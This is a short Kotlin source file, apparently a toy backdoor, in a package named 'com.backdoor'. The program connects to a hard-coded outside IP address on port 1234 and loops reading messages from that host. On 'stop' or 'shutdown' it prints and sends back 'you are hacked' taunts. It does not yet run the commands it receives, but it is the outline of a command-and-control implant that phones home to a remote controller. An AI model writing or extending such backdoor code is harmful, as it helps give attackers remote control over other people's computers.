@file:Suppress("SENSELESS_COMPARISON")

package com.backdoor

import java.io.*
import java.net.Socket

fun main() {
    try {
        val socket = Socket("58.124.112.112", 1234)
        val din = DataInputStream(socket.getInputStream())
        val dout = DataOutputStream(socket.getOutputStream())
        while (din != null) {
            val msg = din.readUTF()
            if (arrayListOf("stop", "shutdown").contains(msg)) {
                println("hi! you are hacked!")
                dout.writeUTF("Hi! you hack computer!")
            }
        }
    } catch (e : IOException) {
        e.printStackTrace()
    }
}
